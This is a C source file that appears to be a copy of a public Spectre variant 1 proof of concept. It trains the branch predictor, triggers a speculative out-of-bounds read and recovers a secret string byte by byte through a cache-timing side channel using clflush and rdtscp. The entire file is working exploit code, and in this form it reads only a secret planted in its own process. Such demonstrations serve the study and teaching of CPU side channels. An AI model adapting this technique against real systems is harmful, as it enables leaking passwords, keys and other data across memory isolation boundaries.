/* Refer to https://github.com/Eugnis/spectre-attack  */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

unsigned int SPY_SIZE = 16;
const size_t CACHE_HIT_THRESHOLD = 80;

// uint8_t unused1[64]; // Why for this?
uint8_t spy[16] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
// uint8_t unused2[64];
uint8_t cache_set[256 * 512];

char secret[] = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;

void victim_function(size_t x)
{
    _mm_clflush(&SPY_SIZE);
    for (volatile int z = 0; z < 100; z++) {
    } /* 确保 cache 页全部换出 */
    if (x < SPY_SIZE) {
        temp &= cache_set[spy[x] * 512];
    }
}

int results[256];

uint8_t readMemoryByte(size_t malicious_x)
{
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t* addr;
    memset(results, 0, sizeof(results));
    for (tries = 999; tries > 0; tries--) {
        for (i = 0; i < 256; i++)
            _mm_clflush(&cache_set[i * 512]);

        training_x = tries % SPY_SIZE;
        for (j = 0; j < 5; j++) {
            for (k = 0; k < 5; k++) {
                victim_function(training_x);
            }
            victim_function(malicious_x);
        }

        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &cache_set[mix_i * 512];

            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != spy[tries % SPY_SIZE]) {
                results[mix_i]++;
            }
        }

        j = 0;
        auto highest = results[0];
        for (i = 1; i < 256; i++) {
            if (results[i] >= highest) {
                highest = results[i];
                j = i;
            }
        }
    }
    return (uint8_t)j;
}

int main(int argc, const char** argv)
{
    printf("Put sensitive string \"%s\" in memory, address %p\n", secret, (void*)(secret));
    size_t malicious_x = secret - (char*)spy;
    int len = strlen(secret);

    for (size_t i = 0; i < sizeof(cache_set); i++)
        cache_set[i] = 1; /* write to cache_set so in RAM not copy-on-write zero pages */

    printf("Attacking:\n");
    while (--len >= 0) {
        auto value = readMemoryByte(malicious_x++);
        printf("%c", (value > 31 && value < 127 ? value : '?'));
    }
    printf("\n");
    return (0);
}